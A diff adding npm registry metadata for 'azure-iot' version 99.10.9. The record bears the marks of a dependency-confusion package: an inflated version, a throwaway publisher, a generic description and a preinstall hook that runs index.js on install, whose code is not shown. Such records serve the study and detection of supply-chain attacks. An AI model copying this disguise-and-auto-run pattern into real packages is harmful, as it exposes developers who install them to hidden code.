@@ -1,0 +1,62 @@
+{
+    "_id": "azure-iot",
+    "name": "azure-iot",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-iot",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-iot@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-uKns8JJcOhQU6dOVUXMU/AwywAGy8mtK0bl5TzuzCHSOI203mgHrD63jFptMLJG9IjWG/s1r6AwF2FLBybT7yw==",
+                "shasum": "9489506b6388402820a00d11a73bb6f2383d365b",
+                "tarball": "https://registry.npmjs.org/azure-iot/-/azure-iot-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5061,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOqEEACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrDig/+L2MgFh5gOqOmDRjNcwC39SA3kz4iHi+JVs6fBgw4FyITB2BN\r\nNz4CgwfLXbzUqV+18XJJB7QBD21GCFhIHqtR9vMeJUyapKdZH+DO2qypdrF2\r\na1bcOWy0TloDLLETylElf7JAdpnN5c4t3g8hIcbkJVdBE3b3BHtQL1b4lnfr\r\nZQedE5a1diYh+4Wsij1lI96LWNOph3yQlGIFbRWlmscjP5R0jemvzb+Y+QAI\r\nCriSEmW+e8E6ebSU8WcjbCddfrl5gQDUBEJosY15wgusWEIbr/6d2SC43sYB\r\n8bJm1geFNQ7Kkd6OncJpjJTaQmnROZLlx0OP+HdCoUH/88h3d8JrpCVGV6uH\r\nkXoxhLnPulDvL1IbBQVaD66rBjRdm59uDEJhYB+T4Hn50tdK1tOiKMTskhQR\r\nxXraIGvv9vwJ1Vax2oXGg6Wy7mL9yA3qwySb/ySZE4ROOX40rekswGALo2/o\r\nIdwMPTfDCPCvONq7ZG4iCFm96llbWRP+3wBQWWUvjZKMqRqxxOnpsUF1eAWJ\r\nNfOvaTyfFyLw1Z8kDXBnJQfHgA8vK40vnX8fNN9bOtK00YuzbzRQbEPtSAH+\r\nM0aTlHbaL8/QRP40bZVQhsw/7ocGFT7L4j92MABNatAOg2j2PCm9DTZq09gX\r\nh+jrhbt5+rKXTHH1+um1qmMGBARSBDVIA5A=\r\n=T4ww\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "25woglzw",
+                "email": "25woglzw@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "25woglzw",
+                    "email": "25woglzw@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-iot_99.10.9_1648009475909_0.8050070828065048"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T04:24:35.908Z",
+        "99.10.9": "2022-03-23T04:24:36.056Z",
+        "modified": "2022-03-23T04:24:36.180Z"
+    },
+    "maintainers": [
+        {
+            "name": "25woglzw",
+            "email": "25woglzw@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
